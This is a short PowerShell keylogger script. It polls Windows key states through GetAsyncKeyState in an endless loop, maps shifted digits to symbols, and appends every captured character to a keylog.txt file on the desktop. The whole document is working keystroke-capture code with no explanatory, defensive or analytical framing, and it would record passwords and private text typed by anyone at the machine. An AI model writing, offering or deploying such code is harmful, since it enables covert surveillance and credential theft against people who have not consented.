# Define the log file path
$logFile = "C:\\Users\\scott\\Desktop\\keylog.txt"

# Function to log keystrokes horizontally
function Log-KeyStroke {
    param ($key)
    if ($key -match "^[a-zA-Z0-9!@#\$%\^&*()]$") {
        Add-Content -Path $logFile -Value $key -NoNewline
    }
}

# PInvoke declarations to capture keystrokes
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }
"@

# Key capture loop
while ($true) {
    Start-Sleep -Milliseconds 100

    foreach ($key in 1..255) {
        $state = [WinAPI]::GetAsyncKeyState($key)
        if ($state -ne 0) {
            # Check if Shift is pressed
            $shift = [WinAPI]::GetAsyncKeyState(16)
            if ($shift -ne 0) {
                # Map the number keys to their Shift counterparts
                $char = switch ($key) {
                    49 {"!"}
                    50 {"@"}
                    51 {"#"}
                    52 {"$"}
                    53 {"%"}
                    54 {"^"}
                    55 {"&"}
                    56 {"*"}
                    57 {"("}
                    48 {")"}
                    default {[char]$key}
                }
            } else {
                $char = [char]$key
            }
            Log-KeyStroke -key $char
        }
    }
}
